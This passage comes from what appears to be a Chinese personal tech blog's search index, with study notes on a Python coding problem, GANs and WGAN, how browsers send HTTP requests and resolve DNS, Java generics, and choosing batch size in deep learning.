class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">    res, v, cnt = <span class="number">0</span>, <span class="number">10000</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())):</span><br><span class="line">            res += <span class="built_in">abs</span>(a)</span><br><span class="line">            <span class="keyword">if</span> a &lt; <span class="number">0</span>: cnt += <span class="number">1</span></span><br><span class="line">            v = <span class="built_in">min</span>(v, <span class="built_in">abs</span>(a))</span><br><span class="line">    <span class="keyword">if</span> cnt % <span class="number">2</span> == <span class="number">1</span>: res -= <span class="number">2</span> * v</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">矩阵中任意两个位置的值都可以做一次变换，那如果矩阵中负数的个数是偶数个，那最终矩阵中所有值都会变成正数，如果是奇数个，那只需要保留绝对值最小的那个值即可，即<span class="number">4</span>对矩阵中所有元素求和再减去两倍的最小值。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>目标检测（上篇）</title>
      <link href="/2021/07/01/%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%E4%B8%8A/"/>
      <url>/2021/07/01/%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<p><img src="https://z3.ax1x.com/2021/07/01/RruYHH.png"></p>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从迁移学习到图像合成</title>
      <link href="/2021/06/20/Transfer_Learning/"/>
      <url>/2021/06/20/Transfer_Learning/</url>
      
        <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?bvid=BV1Qf4y1b7Pc&cid=347140842&page=1&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><p><img src="https://z3.ax1x.com/2021/06/20/RFg4oj.png"></p><p><img src="https://z3.ax1x.com/2021/06/20/RFgblV.png"></p>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器是怎样通信的</title>
      <link href="/2021/06/19/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E6%80%8E%E6%A0%B7%E9%80%9A%E4%BF%A1%E7%9A%84/"/>
      <url>/2021/06/19/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E6%80%8E%E6%A0%B7%E9%80%9A%E4%BF%A1%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<h2 id="第1步，从在浏览器中输入网址开始："><a href="#第1步，从在浏览器中输入网址开始：" class="headerlink" title="第1步，从在浏览器中输入网址开始："></a>第1步，从在浏览器中输入网址开始：</h2><ul><li><strong>首先网址就是URL，通常是访问web服务器，用”http:”，即HTTP协议</strong></li><li><strong>URL的格式会随着协议的不同而不同</strong></li><li><strong>URL的各种格式如下：</strong><ul><li><strong>访问Web服务器或FTP服务器时，URL包括域名和文件路径名，有时还会包含用户名和密码和服务器端口号</strong></li></ul></li></ul><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/192120/18/9188/187284/60cd994bE12331888/5d15ca108f2daa5f.jpg"></p><h2 id="第2步，浏览器对URL进行解析"><a href="#第2步，浏览器对URL进行解析" class="headerlink" title="第2步，浏览器对URL进行解析"></a>第2步，浏览器对URL进行解析</h2><p><strong>对URL解析也就是对URL进行拆分，拆分结果如下：</strong><br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/25315/31/13123/231182/60cd9d42E76517b5c/4415e5064467809d.jpg"></p><ul><li><strong>还有URL中省略文件名的特殊情况，甚至最后不以/结尾，将会直接访问服务器中设置的默认文件</strong></li></ul><h2 id="第3步，根据解析信息来生成HTTP请求消息"><a href="#第3步，根据解析信息来生成HTTP请求消息" class="headerlink" title="第3步，根据解析信息来生成HTTP请求消息"></a>第3步，根据解析信息来生成HTTP请求消息</h2><p><strong>HTTP方法最常用的就是GET和POST：</strong></p><ul><li><strong>在地址栏中输入网址并显示网页，因此这里应该使用 GET 方法</strong></li><li><strong>点击超级链接的场景中也是使用 GET 方法</strong></li><li><strong>如果是表单，在 HTML 源代码中会在表单的属性中指定使用哪种方法来发送请求，可能是 GET也可能是POST</strong></li></ul><h3 id="生成HTTP请求消息的格式："><a href="#生成HTTP请求消息的格式：" class="headerlink" title="生成HTTP请求消息的格式："></a>生成HTTP请求消息的格式：</h3><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/194117/1/9057/110909/60cdad3dEb4f176eb/1baee7cd88773d39.jpg"></p><h3 id="怎么生成HTTP请求消息："><a href="#怎么生成HTTP请求消息：" class="headerlink" title="怎么生成HTTP请求消息："></a>怎么生成HTTP请求消息：</h3><ul><li><strong>第1步，写好方法，是GET还是POST，加一个空格</strong></li><li><strong>第2步，写URI，即文件和程序的路径名，直接从URL中提取出来即可，再加一个空格，写HTTP版本</strong></li><li><strong>第3步，第二行开始写消息头，存放请求的额外信息，如日期，客户端支持的数据类型，软件名称和版本等等</strong></li><li><strong>第4步，空一行，写消息体。GET方法不需要写消息体，POST方法把表单中的信息写上</strong></li></ul><h3 id="生成结果如下："><a href="#生成结果如下：" class="headerlink" title="生成结果如下："></a>生成结果如下：</h3><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/177642/23/10196/223242/60cdafceEe9e56c53/4d1133388c4b3978.jpg"></p><h2 id="第4步，生成请求消息后，向DNS服务器查询Web服务器的IP地址"><a href="#第4步，生成请求消息后，向DNS服务器查询Web服务器的IP地址" class="headerlink" title="第4步，生成请求消息后，向DNS服务器查询Web服务器的IP地址"></a>第4步，生成请求消息后，向DNS服务器查询Web服务器的IP地址</h2><p><strong>虽然浏览器能生成解析地址生成HTTP请求消息，但是浏览器不能发送消息到网络，需要委托操作系统来做</strong></p><h3 id="IP地址原理"><a href="#IP地址原理" class="headerlink" title="IP地址原理"></a>IP地址原理</h3><h4 id="子网："><a href="#子网：" class="headerlink" title="子网："></a>子网：</h4><p><strong>由集线器连接起来几台计算机，看成一个单位</strong></p><h4 id="网络："><a href="#网络：" class="headerlink" title="网络："></a>网络：</h4><p><strong>把子网用路由器连起来形成网络</strong></p><h4 id="IP地址："><a href="#IP地址：" class="headerlink" title="IP地址："></a>IP地址：</h4><ul><li><strong>网络中所有的设备都被分配一个地址，由网络号、主机号组成</strong></li><li><strong>通过IP地址可以判断出访问服务器的位置，从而发送消息</strong></li></ul><h4 id="消息发送过程："><a href="#消息发送过程：" class="headerlink" title="消息发送过程："></a>消息发送过程：</h4><p><strong>发送者的消息先通过子网的集线器发送到最近的路由器上，路由器根据目的地判断并发送到下一个路由器，然后再经过子网的集线器发到下一个路由器，直到发送到目的地</strong></p><h3 id="为什么要查询IP地址？"><a href="#为什么要查询IP地址？" class="headerlink" title="为什么要查询IP地址？"></a>为什么要查询IP地址？</h3><p><strong>因为发送消息需要的不是域名，而是域名对应的IP地址</strong></p><h3 id="怎么向DNS服务器查询IP地址？"><a href="#怎么向DNS服务器查询IP地址？" class="headerlink" title="怎么向DNS服务器查询IP地址？"></a>怎么向DNS服务器查询IP地址？</h3><ul><li><strong>首先操作系统上有DNS客户端，客户端里有Socket库的DNS解析器</strong></li><li><strong>需要查询IP地址时</strong><ul><li><strong>第1步，浏览器会调用操作系统的解析器，解析器委托操作系统的协议栈通过网卡向DNS服务器发送查询消息，然后DNS会返回响应消息</strong></li><li><strong>第2步，响应消息通过协议栈传递给解析器，解析器会取出响应消息中的IP地址，并写入浏览器指定的内存地址中</strong></li></ul></li><li><strong>解析器程序如下：</strong></li></ul><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/180986/16/10049/89745/60cde338Ef32162ea/4a45757e8b9b22c9.jpg"></p><h2 id="第5步，委托操作系统的协议栈向目标IP服务器收发HTTP消息"><a href="#第5步，委托操作系统的协议栈向目标IP服务器收发HTTP消息" class="headerlink" title="第5步，委托操作系统的协议栈向目标IP服务器收发HTTP消息"></a>第5步，委托操作系统的协议栈向目标IP服务器收发HTTP消息</h2><h3 id="基本原理："><a href="#基本原理：" class="headerlink" title="基本原理："></a>基本原理：</h3><ul><li><strong>首先收发消息操作之前，先要建立一条管道连接双方。管道两端的数据出入口叫套接字，所以先创建套接字</strong></li><li><strong>然后通过套接字连接起来形成管道</strong></li><li><strong>这些步骤都是委托协议栈完成的</strong></li></ul><h3 id="第1步，收发消息的准备工作："><a href="#第1步，收发消息的准备工作：" class="headerlink" title="第1步，收发消息的准备工作："></a>第1步，收发消息的准备工作：</h3><ul><li><strong>首先服务器创建套接字，等待客户端创建套接字并返回描述符</strong></li><li><strong>协议栈根据描述符、IP地址、端口号判断哪个套接字和哪个服务器的哪个套接字进行连接管道，连接后就完成了准备工作</strong><ul><li><strong>原理：描述符是用来在一台计算机内部识别套接字的，端口号就是用来识别服务器的套接字的</strong></li></ul></li><li><strong>传输完成后任何一方断开管道，通信就结束，套接字将删除</strong></li></ul><h3 id="第2步，收发HTTP消息"><a href="#第2步，收发HTTP消息" class="headerlink" title="第2步，收发HTTP消息"></a>第2步，收发HTTP消息</h3><ul><li><strong>发送消息：调用write程序组件并指定套接字和HTTP消息（需要发送的数据），协议栈就会发送数据到服务器</strong></li><li><strong>服务器响应消息：</strong><img src="https://img14.360buyimg.com/ddimg/jfs/t1/185016/29/10128/91496/60ce01bdEb0e8d8d3/624e0fc6f36db344.jpg"></li><li><strong>接收消息：调用read程序组件并指定消息存放内存地址，协议栈就会接收数据到接收缓冲区</strong></li></ul><h3 id="第3步，断开连接"><a href="#第3步，断开连接" class="headerlink" title="第3步，断开连接"></a>第3步，断开连接</h3><p><strong>服务器首先断开连接，传达到客户端后，客户端套接字也会断开，浏览器调用read后会得知通信结束，浏览器也会断开</strong></p>]]></content>
      
      
      <categories>
          
          <category> 《网络是怎样连接的》 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GANs入门</title>
      <link href="/2021/06/18/GANs%E5%85%A5%E9%97%A8_(1)/"/>
      <url>/2021/06/18/GANs%E5%85%A5%E9%97%A8_(1)/</url>
      
        <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?bvid=BV1RU4y1h74n&cid=327744141&page=1&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><blockquote><p>“What I cannot create, I do not understand.”<br>                                                                -Richard Feynman</p></blockquote><p>某个事件的分布服从分布p(x),其往往难以获得，因此需要GAN来模拟。</p><iframe src="//player.bilibili.com/player.html?bvid=BV1RU4y1h74n&cid=327744141&page=2&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><p>生成网络通过训练获得一个p(x)分布输出，防御网络通过真实样本分布p(X)来鉴定生成网络的输出是真还是假，若50%判定为真，则形成纳什均衡，训练完成。</p><iframe src="//player.bilibili.com/player.html?bvid=BV1RU4y1h74n&cid=327744141&page=3&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><h2 id="目标函数"><a href="#目标函数" class="headerlink" title="目标函数"></a>目标函数</h2><p><img src="https://z3.ax1x.com/2021/06/16/2XrIUA.png"></p><iframe src="//player.bilibili.com/player.html?bvid=BV1RU4y1h74n&cid=327744141&page=4&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><h2 id="问题一：固定G，D会训练成什么样？"><a href="#问题一：固定G，D会训练成什么样？" class="headerlink" title="问题一：固定G，D会训练成什么样？"></a>问题一：固定G，D会训练成什么样？</h2><p><img src="https://z3.ax1x.com/2021/06/16/2XsZVJ.png"></p><iframe src="//player.bilibili.com/player.html?bvid=BV1RU4y1h74n&cid=327744141&page=5&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><h2 id="问题二：再训练G，G会训练成什么样？"><a href="#问题二：再训练G，G会训练成什么样？" class="headerlink" title="问题二：再训练G，G会训练成什么样？"></a>问题二：再训练G，G会训练成什么样？</h2><p><img src="https://z3.ax1x.com/2021/06/16/2Xyq0g.png"></p><h2 id="KL距离与JS距离"><a href="#KL距离与JS距离" class="headerlink" title="KL距离与JS距离"></a>KL距离与JS距离</h2><p><img src="https://z3.ax1x.com/2021/06/16/2XsvQK.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>也就是说，D达到最优时，G也可以达到真实水平，此时D(X)=1/2</p><hr><iframe src="//player.bilibili.com/player.html?bvid=BV1RU4y1h74n&cid=327744141&page=6&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><h2 id="DCGAN"><a href="#DCGAN" class="headerlink" title="DCGAN"></a>DCGAN</h2><h3 id="Transposed-Convolution"><a href="#Transposed-Convolution" class="headerlink" title="Transposed Convolution"></a>Transposed Convolution</h3><p><img src="https://z3.ax1x.com/2021/06/16/2XWZyq.png"></p><p>6<em>6-&gt;4</em>4</p><h3 id="训练难题：不稳定"><a href="#训练难题：不稳定" class="headerlink" title="训练难题：不稳定"></a>训练难题：不稳定</h3><p>训练开始时，生成的p(x)与真实的p(X)很可能不overlap</p><p><img src="https://z3.ax1x.com/2021/06/16/2XhHoT.png"></p><p><img src="https://z3.ax1x.com/2021/06/16/2X4Vld.png" alt="很可能没有梯度信息"></p><hr><iframe src="//player.bilibili.com/player.html?bvid=BV1RU4y1h74n&cid=327744141&page=7&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><iframe src="//player.bilibili.com/player.html?bvid=BV1RU4y1h74n&cid=327744141&page=8&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><h2 id="WGAN"><a href="#WGAN" class="headerlink" title="WGAN"></a>WGAN</h2><p>采用EM距离：</p><p><img src="https://z3.ax1x.com/2021/06/18/2zxCl9.png"></p><p>只要满足<img src="https://z3.ax1x.com/2021/06/18/2zxQOI.png" alt="1-LZ"></p><p>学到的Discriminater就能够模拟Wasserstein Distance，trainning在任何时候都有梯度</p><h3 id="为了满足1-LZ"><a href="#为了满足1-LZ" class="headerlink" title="为了满足1-LZ"></a>为了满足1-LZ</h3><ul><li>Weight clipping</li><li>Gradient Penalty</li><li><img src="https://z3.ax1x.com/2021/06/18/2zxI76.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第15章 泛型</title>
      <link href="/2021/06/18/%E7%AC%AC15%E7%AB%A0_%E6%B3%9B%E5%9E%8B/"/>
      <url>/2021/06/18/%E7%AC%AC15%E7%AB%A0_%E6%B3%9B%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="15-2-简单泛型"><a href="#15-2-简单泛型" class="headerlink" title="15.2 简单泛型"></a>15.2 简单泛型</h2><p><strong>在没有泛型之前，采用的是继承机制来实现泛型，但是需要强制类型转换，会有风险</strong></p><h3 id="创建泛型类："><a href="#创建泛型类：" class="headerlink" title="创建泛型类："></a>创建泛型类：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">T ...</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建泛型对象</span></span><br><span class="line">A&lt;..&gt; a = <span class="keyword">new</span> A&lt;&gt;();</span><br></pre></td></tr></table></figure><hr><h3 id="15-2-1-使用泛型创建多维元祖，实现一次调用返回多个对象"><a href="#15-2-1-使用泛型创建多维元祖，实现一次调用返回多个对象" class="headerlink" title="15.2.1 使用泛型创建多维元祖，实现一次调用返回多个对象"></a>15.2.1 使用泛型创建多维元祖，实现一次调用返回多个对象</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tuple</span>&lt;<span class="title">A</span>,<span class="title">B</span>,<span class="title">C</span>,...&gt;</span>&#123;<span class="comment">//A,B,C是泛型</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> A first;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> B second; <span class="comment">// 使用final使得客户端程序员无法修改，相当于private+getset方法</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tuple</span><span class="params">(A a,B b)</span></span>&#123;first = a;second = b;&#125; <span class="comment">//构造器</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="15-3-泛型接口"><a href="#15-3-泛型接口" class="headerlink" title="15.3 泛型接口"></a>15.3 泛型接口</h2><p><strong><code>public interface Generator&lt;T&gt; &#123;T next();&#125;</code></strong></p><h3 id="实现接口："><a href="#实现接口：" class="headerlink" title="实现接口："></a>实现接口：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Generator</span>&lt;<span class="title">Integer</span>&gt;</span>&#123; <span class="comment">//指定泛型T具体类型，可以是包装类数据类型也可以是自定义类</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Integer <span class="title">next</span><span class="params">()</span></span>&#123; <span class="comment">// 重写接口中的方法</span></span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="15-4-泛型方法"><a href="#15-4-泛型方法" class="headerlink" title="15.4 泛型方法"></a>15.4 泛型方法</h2><h3 id="为什么要用泛型方法？"><a href="#为什么要用泛型方法？" class="headerlink" title="为什么要用泛型方法？"></a>为什么要用泛型方法？</h3><ul><li><strong>因为泛型类要在实例化的时候就指明类型，如果想换一种类型，不得不重新new一次，可能不够灵活；而泛型方法可以在调用的时候指明类型，更加灵活</strong></li><li><strong>使用泛型类，创建对象时必须指定泛型具体类型；而使用泛型方法，则不必指定，编译器会根据参数自动判断</strong></li></ul><h3 id="泛型方法定义"><a href="#泛型方法定义" class="headerlink" title="泛型方法定义"></a>泛型方法定义</h3><p><strong>泛型参数列表必须置于返回值之前前，泛型方法的类可以是泛型类也可以不是</strong></p><blockquote><ul><li><strong><code>public &lt;T&gt; void f(T x)&#123;...&#125;</code></strong></li><li><strong><code>public &lt;T,E&gt; E f(T a, E b) &#123;...&#125;</code></strong></li><li><strong><code>public  static &lt;T&gt; T f(T a)&#123;&#125;</code>  //泛型静态方法定义</strong></li></ul></blockquote><p><strong>显式指定类型调用泛型方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(T x)</span></span>&#123;<span class="comment">//泛型方法</span></span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">staticfun</span><span class="params">(T x)</span></span>&#123; <span class="comment">//静态泛型方法</span></span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> main&#123;</span><br><span class="line">    A&lt;Integer&gt; a = <span class="keyword">new</span> A&lt;&gt;();</span><br><span class="line">        a.&lt;String&gt;fun(<span class="string">&quot;abc&quot;</span>); <span class="comment">//指定泛型具体类型调用泛型方法</span></span><br><span class="line">        A.&lt;String&gt;staticfun(<span class="string">&quot;abc&quot;</span>); <span class="comment">//指定泛型具体类型调用静态泛型方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="15-7-擦除"><a href="#15-7-擦除" class="headerlink" title="15.7 擦除"></a>15.7 擦除</h2><h3 id="什么是擦除："><a href="#什么是擦除：" class="headerlink" title="什么是擦除："></a>什么是擦除：</h3><ul><li><p><strong>泛型具体类型不同擦除后会变成原生类 如List<String> 和List<Integer>是一种类型，最后都会擦除成List</strong></p></li><li><p><strong>泛型只是用来检查类型正确性，一旦运行就会被擦除</strong></p><h3 id="擦除的结果："><a href="#擦除的结果：" class="headerlink" title="擦除的结果："></a>擦除的结果：</h3></li><li><p><strong><code>List&lt;T&gt;</code>被擦除为<code>List</code>  、  <code>List&lt;String&gt;</code>被擦除为<code>List&lt;Object&gt;</code></strong></p></li><li><p><strong><code>&lt;T extends  A&gt;</code>擦除为<code>&lt;A&gt;</code></strong></p></li></ul><h3 id="什么是边界："><a href="#什么是边界：" class="headerlink" title="什么是边界："></a>什么是边界：</h3><ul><li><strong>运行后泛型会被擦除到上边界</strong></li><li><strong><code>class A&lt;T extends B&gt;</code>擦除到<code>&lt;B&gt;</code></strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> java编程思想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>batch_size详解</title>
      <link href="/2021/06/16/batch_size%E8%AF%A6%E8%A7%A3_(1)/"/>
      <url>/2021/06/16/batch_size%E8%AF%A6%E8%A7%A3_(1)/</url>
      
        <content type="html"><![CDATA[<h1 id="谈谈深度学习中的-Batch-Size"><a href="#谈谈深度学习中的-Batch-Size" class="headerlink" title="谈谈深度学习中的 Batch_Size"></a><strong>谈谈深度学习中的 Batch_Size</strong></h1><p>Batch_Size（批尺寸）是机器学习中一个重要参数，涉及诸多矛盾，下面逐一展开。</p><p><strong>首先，为什么需要有 Batch_Size 这个参数？</strong><br>Batch 的选择，<strong>首先决定的是下降的方向。</strong>如果数据集比较小，完全可以采用<strong>全数据集</strong> （ <strong>Full Batch Learning</strong> ）的形式，这样做至少有 2 个好处：其一，由全数据集确定的方向能够更好地代表样本总体，从而更准确地朝向极值所在的方向。其二，由于不同权重的梯度值差别巨大，因此选取一个全局的学习率很困难。 Full Batch Learning 可以使用<strong>Rprop</strong> 只基于梯度符号并且针对性单独更新各权值。</p><p>对于更大的数据集，以上 2 个好处又变成了 2 个坏处：其一，随着数据集的海量增长和内存限制，一次性载入所有的数据进来变得越来越不可行。其二，以 Rprop 的方式迭代，会由于各个 Batch 之间的采样差异性，各次梯度修正值相互抵消，无法修正。这才有了后来 <strong>RMSProp</strong> 的妥协方案。</p><p><strong>既然 Full Batch Learning 并不适用大数据集，那么走向另一个极端怎么样？</strong><br>所谓另一个极端，就是每次只训练一个样本，即 Batch_Size = 1。这就是<strong>在线学习（Online Learning）</strong>。线性神经元在均方误差代价函数的错误面是一个抛物面，横截面是椭圆。对于多层神经元、非线性网络，在局部依然近似是抛物面。使用在线学习，每次修正方向以各自样本的梯度方向修正，横冲直撞各自为政，<strong>难以达到收敛</strong>。</p><p><img src="https://z3.ax1x.com/2021/06/16/2LFJ78.jpg"></p><p><strong>可不可以选择一个适中的 Batch_Size 值呢？</strong><br>当然可以，这就是<strong>批梯度下降法（Mini-batches Learning）</strong>。因为如果数据集足够充分，那么用一半（甚至少得多）的数据训练算出来的梯度与用全部数据训练出来的梯度是几乎一样的。</p><p><strong>在合理范围内，增大 Batch_Size 有何好处？</strong></p><ul><li>内存利用率提高了，大矩阵乘法的并行化效率提高。</li><li>跑完一次 epoch（全数据集）所需的迭代次数减少，对于相同数据量的处理速度进一步加快。</li><li>在一定范围内，一般来说 Batch_Size 越大，其确定的下降方向越准，引起训练震荡越小。</li></ul><p><strong>盲目增大 Batch_Size 有何坏处？</strong></p><ul><li>内存利用率提高了，但是内存容量可能撑不住了。</li><li>跑完一次 epoch（全数据集）所需的迭代次数减少，要想达到相同的精度，其所花费的时间大大增加了，从而对参数的修正也就显得更加缓慢。</li><li>Batch_Size 增大到一定程度，其确定的下降方向已经基本不再变化。</li></ul><p><strong>调节 Batch_Size 对训练效果影响到底如何？</strong><br>这里跑一个 LeNet 在 MNIST 数据集上的效果。MNIST 是一个手写体标准库，我使用的是 **Theano **框架。这是一个 Python 的深度学习库。<a href="https://link.zhihu.com/?target=http://deeplearning.net/software/theano/install.html%23install">安装方便</a>（几行命令而已），调试简单（自带 Profile），GPU / CPU 通吃，<a href="https://link.zhihu.com/?target=http://deeplearning.net/tutorial/contents.html">官方教程相当完备</a>，支持模块十分丰富（除了 CNNs，更是支持 RBM / DBN / LSTM / RBM-RNN / SdA / MLPs）。在其上层有 <a href="https://link.zhihu.com/?target=http://keras.io/">Keras</a> 封装，支持 GRU / JZS1, JZS2, JZS3 等较新结构，支持 Adagrad / Adadelta / RMSprop / Adam 等优化算法。<br>运行结果与上文分析相印证：</p><ul><li><p>Batch_Size 太小，算法在 200 epoches 内不收敛。</p></li><li><p>随着 Batch_Size 增大，处理相同数据量的速度越快。</p></li><li><p>随着 Batch_Size 增大，达到相同精度所需要的 epoch 数量越来越多。</p></li><li><p>由于上述两种因素的矛盾， Batch_Size 增大到某个时候，达到<strong>时间上</strong>的最优。</p></li><li><p>由于最终收敛精度会陷入不同的局部极值，因此 Batch_Size 增大到某些时候，达到最终收敛<strong>精度上</strong>的最优。</p></li></ul><h2 id="batch-size-需要调参"><a href="#batch-size-需要调参" class="headerlink" title="batch size 需要调参"></a>batch size 需要<strong>调参</strong></h2><p>可以确定的是，<strong>batch size 绝非越大越好</strong>。<br>因为 batch size 的极限是训练集样本总个数，而这是当初神经网络还未如此之火时的训练方式 Gradient Descent (GD)。<br>2014 年初我上的人工神经网络 (还不叫深度学习，非常旧的教学材料) 课程，老师留的作业就是用自己写个神经网络去实现 4 输入<a href="https://link.zhihu.com/?target=https://wenku.baidu.com/view/bba0bf1090c69ec3d5bb7537.html">异或门</a>。<br><img src="https://z3.ax1x.com/2021/06/16/2LVSD1.jpg"></p><p>中间层的 w 的梯度是纯粹用解析公式计算而得 (不是如今的计算图)，激活函数是 sigmoid (不是 Relu)，而且每次更新都使用所有的 16 个样本，就是单纯的去完全拟合训练集，只是为了查看神经网络拟合任意函数的能力 (这很不现实，因为如果知道所有样本，压根就不需要去学习。现实的任务，是需要从有限的训练样本中训练出可以用于预测测试数据的模型)。<br>下面是我当时交作业的 loss 下降图。可以看到 loss 呈阶梯式下降。当时被解读为是陷入局部最小值。22000次 (横坐标) 迭代才能够拟合 (纵坐标是 loss 大小)，用全部样本作为 batch size 的 Gradient Descent (GD) 效果是很差的。</p><p>深度学习和以前的人工神经网络差在哪里了？为什么近几年突然变成各个媒体吹上天的神话？事实上深度学习的核心技术在二三十年前就有，是各个技术组合方式的才造成了今天的差异 (也因如此，刚入门的伙伴很容易因某个细节不同甚至无法收敛)。这可以从 keras, lasagne 等库包的文档分类注意到<strong>深度学习的跃进来源于不同技术的组合</strong>：<strong>层</strong>、<strong>梯度更新方式</strong>、<strong>初始化方式</strong>、<strong>非线性</strong>、<strong>目标函数</strong>、<strong>正规项</strong>等。(研究时也会分别去提升不同的技术细节)<br>现在人们分析深度学习崛起原因时人们常会说：因为大数据、GPU 的高并行计算能力、ReLU，等等，但还有一个常被忽略，简单却又意外强大的因素就是 Gradient Descent (GD) 替换成了 Stochastic Gradient Descent (SGD)。随后又有大批的弥补 朴素SGD 不足的更新算法，也就是在 <strong>梯度更新方式</strong> 这一类。可以参考这篇文章 <a href="https://link.zhihu.com/?target=http://ruder.io/optimizing-gradient-descent/">An overview of gradient descent optimization algorithms</a>。</p><ul><li>Gradient 